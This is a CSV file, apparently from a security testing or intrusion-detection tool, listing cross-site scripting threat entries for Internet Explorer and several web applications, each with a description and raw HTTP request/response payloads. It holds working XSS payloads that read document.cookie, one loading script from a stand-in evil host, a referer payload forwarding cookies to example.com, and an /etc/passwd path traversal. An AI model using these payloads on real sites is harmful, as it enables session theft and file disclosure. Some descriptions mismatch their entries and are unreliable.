XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
InternetExplorerHistoryXSS.xml,Internet Explorer History XSS Attack,This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 19:14:11 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 19:14:00 GMT[[0D 0A ]]ETag: ""47e76-25a-76822e00""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 602[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A 0D 0A ]]<p><font size=""7"">RefBack-MyPage</font></p>[[0D 0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0D 0A ]]  at <a href=""http://umbrella.mx.tc"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0D 0A ]]<SCRIPT>[[0D 0A ]]VtPage=""http://www.google.com/"";[[0D 0A 0D 0A ]]w=window.open(""javascript:alert('JPU: \\n document.cookie = \\n'+document.cookie)\;window.opener.Ref=history.back;"",""_search"");[[0D 0A ]]alert(""wait until the JPU is executed."");[[0D 0A ]]alert(""[winMain].Ref = \n"" + Ref);[[0D 0A 0D 0A ]]w=window.open(VtPage,""_search"");[[0D 0A ]]alert(""wait for VtPage"");[[0D 0A ]]Ref();[[0D 0A ]]alert(""MISSION COMPLETED."");[[0D 0A 0D 0A 0D 0A 0D 0A 0D 0A ]]</SCRIPT>"
﻿InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 18:51:35 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 18:51:13 GMT[[0D 0A ]]ETag: ""47e76-1d5-25076a40""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 469[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html><head></head>[[0A ]]<body><p><font size=""7"">WsOpenFileJPU-MyPage</font></p>[[0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0A ]]  at <a href=""http://umbrella.mx.tc/"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0A ]]<script>[[0A ]]VtUrl=""http://www.google.com/"";[[0A ]]window.open(VtUrl,""_search"");[[0A ]]alert(""wait for VtUrl in Ws"");[[0A ]]window.open(""file:javascript:alert('document.cookie = '+document.cookie)"",""_search"");[[0A ]]</script></body></html>"
﻿InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 19:08:31 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 18:51:13 GMT[[0D 0A ]]ETag: ""47e76-1d5-25076a40""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 469[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html><head></head>[[0A ]]<body><p><font size=""7"">WsOpenFileJPU-MyPage</font></p>[[0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0A ]]  at <a href=""http://umbrella.mx.tc/"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0A ]]<script>[[0A ]]VtUrl=""http://www.google.com/"";[[0A ]]window.open(VtUrl,""_search"");[[0A ]]alert(""wait for VtUrl in Ws"");[[0A ]]window.open(""file:javascript:alert('document.cookie = '+document.cookie)"",""_search"");[[0A ]]</script></body></html>"
﻿UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,"GET / HTTP/1.0[[0A ]]Referer: http://example.com[[0A ]]User-Agent: Special brand ""/><Script>alert(&quot;1mp3r3ctr0x3rs&quot;);</script>[[0A 0A 0A]]"
UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.0 200 OK[[0D 0A ]]Date: Wed, 20 Apr 2005 20:50:27 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)                   <script>alert('1mp3rfectp3wns');</script>[[0D 0A ]]Last-Modified: Wed, 20 Apr 2005 20:49:14 GMT[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<HTML><BODY><A href='http://google.com'>TEST</a></Body></html>[[0D 0A]]"
﻿absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,GET /gallery.asp?action=viewimage&categoryid=8&text=&imageid=43&box=&shownew='><script>('XSS')</script> HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Msnbot/2.4[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿antvilleXSS.xml,Antville URL XSS injection,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the script is inserted into the page with no checking.  Antiville is a web application that typically listens on port 80.",HTTP,TCP,GET /project/about/%3Cscript%3Ealert('XSS');%3C/script%3E HTTP/1.0[[0D 0A 0D 0A]]
antvilleXSS.xml,Antville URL XSS injection,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the script is inserted into the page with no checking.  Antiville is a web application that typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿awstatsXSS.xml,AWStats Referer XSS,"This threat sends a crafted HTTP Request with the referrer field containing a double quote "".  This double quote is escaped in C fashion when displayed on page, allowing an event handle to be created inside of the hyperlink.   This threat will specifically attempt to forward cookie information to example.com.",HTTP,TCP,"GET / HTTP/1.0[[0A ]]Referer: http://www.example.com""onMouseOver='window.location=this.href+document.cookie'[[0A 0A 0A]]"
awstatsXSS.xml,AWStats Referer XSS,"This threat sends a crafted HTTP Request with the referrer field containing a double quote "".  This double quote is escaped in C fashion when displayed on page, allowing an event handle to be created inside of the hyperlink.   This threat will specifically attempt to forward cookie information to example.com.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿b1gbb_xss.xml,B1GBB Visitenkarte.PHP Cross Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in ColdFusion Fusebox. This can allow an attacker to steal session and cookie information. B1GBB is a web application, and will typically listen on port 80.",HTTP,TCP,GET /visitenkarte.php?user=%22%3E%3Cscript%3Ealert(1);%3C/script%3E HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
b1gbb_xss.xml,B1GBB Visitenkarte.PHP Cross Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in ColdFusion Fusebox. This can allow an attacker to steal session and cookie information. B1GBB is a web application, and will typically listen on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿babykatie_vsreal_xss.xml,ScriptsEZ Easy Ad-Manager Details.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. Easy Ad-Manager is a web application that typically listens on port 80,HTTP,TCP,GET /vscal/index.php?page=showlisting&lid=<SCRIPT%20SRC=evilsite.com//xss.js></SCRIPT> HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
babykatie_vsreal_xss.xml,ScriptsEZ Easy Ad-Manager Details.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. Easy Ad-Manager is a web application that typically listens on port 80,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿blur6ex_xss.xml,Blursoft Blur6ex Cross-site scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Blur6ex is a web application that typically listens on port 80,HTTP,TCP,GET /blur/index.php?shard=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0[[0D 0A ]]Host: www.owned.com[[0D 0A ]]User-Agent: Googlebot/2
blur6ex_xss.xml,Blursoft Blur6ex Cross-site scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Blur6ex is a web application that typically listens on port 80,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿contentnow_xss.xml,ContentNow 1.30 (upload/xss) Cross-site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. ContentNow is a web application that typically listens on port 80.,HTTP,TCP,"GET /cn/upload.php?path=""><script>alert(""xss"")</script> HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
contentnow_xss.xml,ContentNow 1.30 (upload/xss) Cross-site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. ContentNow is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿contrexx_XSS_injection.xml,Contrexx Cross Site Scripting Attack,"This attack uses a XSS flaw in the Contrexx CMS.  This allows arbitrary injection of Javascript into the viewable page, allowing an attacker to steal session, password, and other personal information from the end user.  Contrexx is a PHP web application, and typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿coppermine_xss.xml,Coppermine <= 1.4.12 Cross Site Scripting ,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,GET /cpg/mode.php?admin_mode=1&referer=javascript:alert  HTTP 1.0[[0D 0A 0D 0A]]
coppermine_xss.xml,Coppermine <= 1.4.12 Cross Site Scripting ,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿coppermine_xss_b.xml,Coppermine <= 1.4.12 Cross Site Scripting and Local File Inclusion,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,GET /cpg/viewlog.php?log=../../../../../../../../../etc/passwd%00  HTTP 1.0[[0D 0A 0D 0A]]
coppermine_xss_b.xml,Coppermine <= 1.4.12 Cross Site Scripting and Local File Inclusion,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿cubecart_xss.xml,CubeCart Cross-site Scripting Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the
script is inserted into the page with no checking. CubeCart is a web application that typically listens on
port 80",HTTP,TCP,"GET /store/admin/filemanager/preview.php?file=""><script>alert(document.cookie)</script> HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
cubecart_xss.xml,CubeCart Cross-site Scripting Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the
script is inserted into the page with no checking. CubeCart is a web application that typically listens on
port 80",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿drake_cms_xss.xml,Drake CMS UI.DTA.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the UI.DTA.PHP function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Drake CMS is  a web application, and typically listens on port 80.",HTTP,TCP,GET /admin/classes/ui.dta.php?desc[][len]=1&desc[][title]=<script>alert(document.cookie);</script>admin/classes/ui.dta.php?desc[][len]=1&desc[][title]=<script>alert(document.cookie);</script> HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
